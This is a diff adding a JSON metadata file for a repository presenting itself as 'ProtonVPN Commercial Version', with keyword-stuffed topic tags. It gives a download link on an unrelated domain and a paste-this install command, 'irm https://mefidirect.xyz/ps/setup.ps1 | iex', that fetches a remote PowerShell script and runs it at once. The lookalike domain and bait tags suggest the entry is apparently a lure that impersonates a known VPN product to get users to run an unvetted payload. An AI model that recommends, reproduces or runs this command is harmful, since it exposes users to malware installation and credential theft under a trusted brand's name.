@@ -1,0 +1,28 @@
+{
+  "repo": "protonvpn-commercial-version",
+  "product": "ProtonVPN Commercial Version",
+  "kind": "vpn",
+  "install_type": "download",
+  "download_url": "https://protonvpn.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "vpn",
+  "topics": [
+    "protonvpn-workspace",
+    "protonvpn-offline-installer",
+    "protonvpn-build",
+    "protonvpn-utility",
+    "zip-package",
+    "wifi-protection",
+    "protonvpn-portable-ready",
+    "privacy-client",
+    "online-privacy",
+    "daily-driver",
+    "protonvpn-windows-guide",
+    "kill-switch",
+    "local-first",
+    "pro-workflow"
+  ]
+}
